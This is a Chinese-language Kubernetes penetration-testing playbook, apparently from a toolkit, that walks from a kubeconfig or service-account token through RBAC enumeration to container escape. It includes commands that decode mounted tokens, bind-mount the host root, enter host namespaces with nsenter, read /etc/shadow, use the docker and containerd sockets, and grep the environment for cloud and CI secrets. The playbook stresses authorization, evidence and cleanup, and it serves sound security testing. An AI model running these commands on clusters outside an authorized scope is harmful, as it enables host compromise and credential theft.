# K8s RBAC 到逃逸（k8s-rbac-escape）

> 从 kubeconfig/SA token 出发，先证明权限，再找逃逸面；离线看不到的 RBAC 一律标 unknown。
> 配套：`references/k8s-and-container.md`、`scripts/adcloud-check.py`。

## 1. 离线先看配置

```bash
python Tool/scripts/adcloud-check.py --kubeconfig <kubeconfig>
```

只看：context 是否解析、TLS 是否校验、user 是否有凭据、token 是否过期、名称是否像宽权限。
**不要**把 `cluster-admin` 名称、JWT `system:masters` 组直接写成“已提权”；绑定要在线验证。

## 2. 在线枚举

```bash
export KUBECONFIG=<kubeconfig>
kubectl config current-context
kubectl auth can-i --list
kubectl auth can-i --list --as=system:serviceaccount:<ns>:<sa>
kubectl get clusterrolebinding -o wide
kubectl get rolebinding -A -o wide
```

```bash
# 找 wildcard / 高权规则
kubectl get clusterrole -o json | jq '.items[] | select(.rules[]?.verbs[]?=="*") | .metadata.name'
kubectl get role -A -o json | jq '.items[] | select(.rules[]?.verbs[]?=="*") | .metadata.name'
```

重点：`create pods`、`get secrets`、`impersonate`、`bind`、`escalate`、`patch deployments`、`create pods/exec`。

## 3. Token 读取与判断

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
python - <<'PY'
import base64,json
t=open('/var/run/secrets/kubernetes.io/serviceaccount/token').read().strip()
p=t.split('.')[1]; p+='='*(-len(p)%4)
print(json.dumps(json.loads(base64.urlsafe_b64decode(p)),indent=2))
PY
```

看 `sub`、`groups`、`exp`、`aud`、`iss`。`exp` 过期 = 无效证据；`system:masters` = 绕过 RBAC 的强线索，但仍需在线动作。

## 4. 权限 -> 逃逸面

| 权限 | 动作 | 判据 |
|---|---|---|
| `create pods` | 带 hostPath/privileged/hostPID 的 Pod | 宿主 `id` / 宿主文件可读 |
| `create daemonsets` | 每个节点起 Pod | 节点级文件/凭据可读 |
| `get secrets` | 读 SA token/registry/云密钥 | Secret 实际可用 |
| `patch deployments` | 改现有工作负载加挂载/换镜像 | 新 Pod 起来且逃逸成功 |
| `impersonate` | 以高权用户/组请求 | 返回目标身份可见资源 |
| `bind`/`escalate` | 绑高权 Role 到当前主体 | `auth can-i` 前后对比 |
| `create pods/exec` | 进入现有 Pod | 命令执行返回 |

## 5. 逃逸命令（授权内）

```bash
id; capsh --print 2>/dev/null
cat /proc/1/cgroup; mount | grep -E 'hostPath|docker.sock|containerd.sock'
# privileged / CAP_SYS_ADMIN
mkdir -p /mnt/host; mount --bind / /mnt/host; ls /mnt/host
nsenter -t 1 -m -u -i -n -p -- id
# hostPID
nsenter -t 1 -m -u -i -n -p -- cat /etc/shadow
# docker/containerd socket
docker -H unix:///var/run/docker.sock ps
ctr -a /run/containerd/containerd.sock -n k8s.io containers list
```

判据统一：**宿主命名空间 `id` 或宿主文件/凭据可读**，有完整复现命令。
仅“Pod 是 privileged”/“有 socket”不算逃逸成功。

## 6. 镜像与 CI

```bash
kubectl get secret -A -o json | jq -r '.items[] | select(.type=="kubernetes.io/dockerconfigjson") | .metadata.namespace+"/"+.metadata.name'
trivy image --severity HIGH,CRITICAL <image>
trivy fs --scanners secret .
env | grep -Ei 'AWS|TOKEN|SECRET|CI_|GITHUB|GITLAB'
```

- 镜像：层内 `.env`/`.git`/`~/.aws`/CI token 比“版本旧”更值得追。
- Registry：拿到 dockerconfigjson 后验证能否拉取/推送授权内镜像。
- CI：看 token scope、runner 是否共享、OIDC trust 的 `sub`/`aud` 是否过宽。
- 判据：实际读到 protected env、推镜像、或 AssumeRole 成功。

## 7. 失败判据

| 现象 | 原因 | 处理 |
|---|---|---|
| `Unauthorized` | token 过期/错集群 | 重取 token，核对 exp/iss/aud |
| `Forbidden` | RBAC 不足 | `auth can-i --list`，换 SA/角色 |
| Pod 创建失败 | PSA/Quota/Admission | 查 namespace 标签/quota |
| 逃逸 `Operation not permitted` | 缺 CAP/只读/seccomp | 换面或停 |
| Secret 为空 | 旧式 token 不再生成 | 用 projected token/换目标 |
| 扫描无结果 | 私有 registry/架构不匹配 | 先拉取/指定 platform |

## 8. 清理与边界

- 删除测试 Pod/Job/DaemonSet、临时 RoleBinding、上传工具、Secret 副本。
- 恢复被改的 Deployment；不导出业务数据；不创建计费资源。
- 只在授权集群/命名空间操作；不修改集群策略除非单独授权并备份。
- 不把“有权限”写成“已逃逸”；不把“镜像有 CVE”写成“可提权”。
